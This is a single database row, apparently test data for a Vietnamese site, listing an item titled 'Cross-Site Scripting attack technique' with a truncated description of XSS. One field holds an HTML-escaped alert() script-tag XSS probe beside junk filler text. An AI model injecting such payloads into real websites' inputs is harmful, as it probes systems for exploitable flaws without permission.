(22, 1, 1, 'Kĩ thuật tấn công CROSS-SITE SCRIPTING', '&lt;ul&gt;\r\n	&lt;li&gt;&amp;lt;script&amp;gt;alert(&amp;#39;Website đang bị lỗi XSS!&amp;#39;);&amp;lt;/script&amp;gt;&lt;/li&gt;\r\n	&lt;li&gt;&amp;acirc;cscascascasc&lt;/li&gt;\r\n&lt;/ul&gt;\r\n', 'Cross-Site Scripting (XSS) là một trong những kĩ thuật tấn công phổ biến nhất hiên nay, đồng thời nó cũng là một trong những vấn đề bảo mật quan trọng đối với các nhà phát triển web và cả những người ', 123123123, 'images/products/1_1633944947.png', 'files/products/1_1633944947.zip', 1, 1633944947, 1633944947, 0);

